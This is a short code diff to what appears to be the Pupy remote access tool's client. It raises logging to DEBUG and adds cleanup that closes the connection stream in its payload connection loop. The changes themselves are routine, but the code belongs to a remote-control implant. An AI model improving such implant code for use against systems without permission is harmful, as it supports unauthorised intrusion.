@@ -74,7 +74,7 @@ except ImportError:
 except Exception as e:
     logging.warning(e)
 
-logging.getLogger().setLevel(logging.WARNING)
+logging.getLogger().setLevel(logging.DEBUG)
 
 try:
     import pupy
@@ -339,6 +339,7 @@ def rpyc_loop(launcher):
     global attempt
     global debug
 
+    stream=None
     for ret in launcher.iterate():
         try:
             if isinstance(ret, tuple):  # bind payload
@@ -400,6 +401,12 @@ def rpyc_loop(launcher):
                     logging.exception(e)
                 except:
                     print "Exception ({}): {}".format(type(e), e)
+        finally:
+            if stream is not None:
+                try:
+                    stream.close()
+                except:
+                    pass
 
 if __name__ == "__main__":
     main()
